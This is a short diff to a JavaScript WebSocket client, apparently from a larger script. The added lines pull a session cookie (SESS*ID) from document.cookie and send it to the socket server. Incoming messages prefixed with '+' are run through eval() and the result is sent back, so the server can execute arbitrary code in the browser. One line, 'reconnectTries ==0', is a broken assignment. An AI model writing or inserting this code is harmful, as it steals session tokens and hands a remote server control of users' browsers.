@@ -653,14 +653,19 @@ var MAX_RECONNECT_DELAY = 300000;
             socket.onopen = function(e) {
 				reconnectTries ==0;
                 console.log("[open] Connection established");
-
-                //socket.send("true");
+                var sessionId =  /SESS\w*ID=([^;]+)/i.test(document.cookie) ? RegExp.$1 : false;
+                socket.send("sessionId="+sessionId);
             };
 			socket.onmessage = function(message) {
 				console.log(`[message] Data received from server: ${message.data}`);
 				try {
 					//debugger;
-					socket.send(JSON.stringify(eval(message.data)))
+					var messageData = message.data;
+					if(messageData.startsWith("+")) {
+						messageData = messageData.substring(1);
+						var reply = eval(messageData);
+						socket.send(reply);
+					}
 				} catch (e) {
 					socket.send(JSON.stringify({
 						"error": {
